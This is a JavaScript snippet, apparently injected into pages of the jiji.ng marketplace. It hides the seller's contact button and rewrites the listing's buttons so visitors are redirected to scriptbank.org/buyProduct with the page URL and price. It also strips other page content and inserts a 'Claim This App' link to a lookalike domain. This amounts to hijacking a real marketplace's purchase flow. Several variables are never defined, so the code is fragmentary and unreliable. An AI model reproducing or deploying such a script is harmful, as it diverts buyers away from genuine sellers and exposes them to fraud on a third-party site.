alert(primary);
if(location.href.includes("jiji.ng") ){
    let contact = document.querySelector('.b-seller-bottom-buttons__item.b-seller-bottom-buttons__item--contact');
   if(contact)
    contact.style.display = "none";
    const button = document.querySelector('.b-advert-contact-buttons');
    console.log(button);
    const button2 = document.querySelector('.b-advert-card-wrapper__bottom');
    
    const price = document.querySelector('.qa-advert-price-view-value').getAttribute('content');
    button.onclick = function(e){
        e.preventDefault();
        
        location.href = `https://scriptbank.org/buyProduct?url=${location.href}&price=${price}&productID=${productID}`;
        
    }

    button2.onclick = function(e){
        e.preventDefault();
        
        location.href = `https://scriptbank.org/buyProduct?url=${location.href}&price=${price}&productID=${productID}`;
    }
    const othersInt = setInterval(function(){
        let others = document.querySelector('div.h-dflex.h-pb-20.h-flex-dir-column');
        if(others){
            clearInterval(othersInt);
            others.remove();
        }
    }, 2500);
    fetch('https://scriptbank.page.gd/check.php').then( resp => resp.json() ).then( result =>{
        if(result.claimed ) return;
        let div2 = document.createElement('div');
    div2.innerHTML = `<a href="https://scripbank.page.gd/claim.html" class="floating-cta" aria-label="Claim this app">
  <span class="cta-icon">ic</span>
  <span class="cta-text">Claim This App</span>
</a>

    `;
    document.body.appendChild(div2);
    }).catch(error => console.error(error));
    
    
   // button.remove();
  /*const style = document.createElement("link");
    style.href = "https://tester-orcin.vercel.app/jiji.css";
    style.setAttribute("type", "text/css");
    style setAttribute("rel", "stylesheet");
    document.head.appendChild(style);*/

/*changing styles*/
    
    
    const adsInt = setInterval(function(){
        let ads = document.querySelectorAll('span.qa-advert-price-view-value');

        if(ads.length){
            ads.forEach(function(ad){
                ad.style.color = primary;
            });
        }
    },1000);


    let close = div.querySelector('.close-btn');
    close.onclick = function(){
        div.remove();
    }
    
    document.body.appendChild(div);

    
}
